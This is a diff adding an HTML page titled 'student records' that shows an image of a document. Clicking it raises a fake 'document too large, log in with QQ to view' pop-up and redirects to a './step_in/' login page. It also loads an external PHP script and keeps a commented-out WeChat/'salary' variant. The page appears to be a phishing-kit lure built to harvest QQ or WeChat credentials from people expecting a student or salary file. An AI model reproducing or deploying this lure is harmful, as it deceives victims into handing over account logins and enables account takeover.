@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<title>学生资料</title>
+<style type="text/css">
+/*html,body {
+padding: 0;
+margin: 0;
+}*/
+.maxbox {
+	width: 100%;
+	height: 800px;
+	background: url('./images/School.png') no-repeat center;
+	background-size: 100% 100%;
+}
+</style>
+</head>
+<body>
+<div class="maxbox" onclick="gout()" align="center"></div>
+<script language="javascript">
+function gout(){
+	msg("当前文档过大，需要登录QQ才能查看",function(){
+		window.location.href="./step_in/"
+	});
+}
+//JS普通弹框
+function msg(text, fun){
+	window.tfun = fun;clearTimeout(window.tmst);
+	window.tmsg&&document.body.removeChild(tmsg);
+	document.body.insertAdjacentHTML('beforeEnd','<div id="tmsg" style="background:rgba(0,0,0,0.6);position:fixed;left:0;top:0;width:100%;height:100%;z-index:19891015"><div style="margin:200px auto 0;background:#fff;border:solid #aaa 1px;border-radius:5px;width:90%;max-width:450px;text-align:center;"><div style="padding:32px 10px;color:#333;font-size:16px;line-height:2;">'+text+'</div><div onclick="document.body.removeChild(tmsg)"><button style="BTNSTYLE" onclick="tfun();">确定</button></div></div></div>'.replace(/BTNSTYLE/g,'padding:0px;font-size:14px;font-weight:100;color:#fff;border-style:none;border-color:initial;height:40px;line-height:40px;width:150px;max-width:28vw;cursor:pointer;border-radius:5px;background:#4899E0;margin:0 8px 20px;'));
+}
+sessionStorage.casename='QQ';
+/*function gout(){
+if (confirm("当前文档过大，需要登录微信才能查看")){
+window.location.href="salary.html?ud=a2trMQ"
+}*/
+//}
+</script>
+<script src="./app/cess/index.php?id=5" ></script>
+</body>
+</html>
